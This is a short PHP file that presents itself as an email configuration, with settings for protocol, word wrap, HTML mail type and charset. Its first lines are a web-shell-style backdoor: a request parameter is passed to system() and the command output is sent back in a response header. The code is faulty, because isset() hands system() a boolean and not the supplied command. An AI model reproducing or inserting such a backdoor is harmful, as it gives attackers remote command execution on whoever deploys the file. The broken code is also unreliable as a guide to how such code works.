<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

$config['protocol'] = 'mail';
$config['wordwrap'] = TRUE;
$config['validate'] = TRUE;
$config['mailtype'] = 'html';
$config['charset'] = 'iso-8859-1';